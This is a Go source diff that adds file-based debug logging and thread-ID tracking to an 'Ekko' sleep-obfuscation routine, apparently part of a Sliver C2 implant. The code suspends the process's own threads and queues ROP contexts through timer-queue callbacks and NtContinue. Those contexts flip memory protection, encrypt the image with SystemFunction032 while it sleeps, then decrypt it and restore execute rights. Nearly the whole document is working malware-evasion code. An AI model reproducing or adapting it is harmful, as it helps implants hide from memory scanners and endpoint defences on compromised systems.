@@ -7,6 +7,10 @@ import (
 	"unsafe"
 
 	"golang.org/x/sys/windows"
+
+	"fmt"
+	"os"
+	"time"
 )
 
 const (
@@ -39,12 +43,26 @@ var (
 	procSystemFunction032 = Advapi32dll.NewProc("SystemFunction032")
 )
 
+
+func writeWithTimestamp(value interface{}) {
+    f, _ := os.OpenFile("C:\\sliverlog.txt", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
+    defer f.Close()
+
+    timestamp := time.Now().Format(time.RFC3339)
+
+    text := fmt.Sprintf("%v", value)
+    f.WriteString(timestamp + " - " + text + "\n")
+}
+
+
 func EkkoSleep(sleepTime uint64) error {
 
 	currentProcessID := uint32(windows.GetCurrentProcessId())
 
 	// Take a snapshot of all running threads in the system
-	hThreadSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
+	//hThreadSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
+	// Attempt to capture all, so that the 0 value is not ignored
+	hThreadSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPALL, 0)
 	if err != nil {
 		return err
 	}
@@ -58,6 +76,8 @@ func EkkoSleep(sleepTime uint64) error {
 	if err != nil {
 		return err
 	}
+
+	var suspendedThreadIDs []uint32
 
 	for {
 		if te32.OwnerProcessID == currentProcessID {
@@ -79,6 +99,9 @@ func EkkoSleep(sleepTime uint64) error {
 
 				if dwStartAddress >= ImageBase && dwStartAddress <= ImageEndAddress {
 					procSuspendThread.Call(uintptr(hThread))
+					writeWithTimestamp("Suspended Thread: ")
+					writeWithTimestamp(te32.ThreadID)
+					suspendedThreadIDs = append(suspendedThreadIDs,te32.ThreadID)
 				} else {
 					goto nextThread
 				}
@@ -94,30 +117,40 @@ func EkkoSleep(sleepTime uint64) error {
 		}
 	}
 
-
+	writeWithTimestamp("Threads suspended")
 	te32.Size = uint32(unsafe.Sizeof(te32))
 	err = windows.Thread32First(hThreadSnapshot, &te32)
 	if err != nil {
 		return err
 	}
 
+	writeWithTimestamp("Going into internal _ekko")
 	err = ekko(sleepTime)
+	writeWithTimestamp("Coming out of internal _ekko")
 	error2 := err
+        writeWithTimestamp("error 2 below:")
+        writeWithTimestamp(error2)
 
 
 	// resume threads
+        /*
 	for {
 		if te32.OwnerProcessID == currentProcessID {
 
 			if windows.GetCurrentThreadId() != te32.ThreadID {
+
 
 				hThread, err := windows.OpenThread(0xFFFF, false, te32.ThreadID)
 				if err != nil {
 					continue
 				}
 				defer windows.CloseHandle(hThread)
+				writeWithTimestamp(hThread)
 
 				procResumeThread.Call(uintptr(hThread))
+				writeWithTimestamp("Resumed Successfully")
+
+
 
 			}
 		}
@@ -128,6 +161,20 @@ func EkkoSleep(sleepTime uint64) error {
 			break // No more threads
 		}
 	}
+        */
+	for _, threadID := range suspendedThreadIDs {
+		hThread, err := windows.OpenThread(0xFFFF, false, threadID)
+		if err != nil {
+			continue
+		}
+		defer windows.CloseHandle(hThread)
+		writeWithTimestamp("Resuming... ")
+		writeWithTimestamp(threadID)
+		procResumeThread.Call(uintptr(hThread))
+		writeWithTimestamp("Resumed Successfully")
+	}
+
+	writeWithTimestamp("Resumed threads")
 
 	if error2 != nil {
 		return error2
@@ -212,14 +259,17 @@ func ekko(sleepTime uint64) error {
 	RopSetEvt.Rip = uint64(procSetEvent.Addr())
 	RopSetEvt.Rcx = uint64(hEvent)
 
+	writeWithTimestamp("@Ekko ROP: Queueing instructions")
 	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopProtRW)), 100, 0, WT_EXECUTEINTIMERTHREAD)
 	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopMemEnc)), 200, 0, WT_EXECUTEINTIMERTHREAD)
 	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopDelay)), 300, 0, WT_EXECUTEINTIMERTHREAD)
 	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopMemDec)), 400, 0, WT_EXECUTEINTIMERTHREAD)
 	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopProtRX)), 500, 0, WT_EXECUTEINTIMERTHREAD)
 	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopSetEvt)), 600, 0, WT_EXECUTEINTIMERTHREAD)
+	writeWithTimestamp("@Ekko ROP: END Queueing instructions")
 
 	windows.WaitForSingleObject(windows.Handle(hEvent), windows.INFINITE)
+	writeWithTimestamp("@Ekko ROP: WaitForSingleObject is Over")
 	procDeleteTimerQueue.Call(hTimerQueue)
 
 	return nil
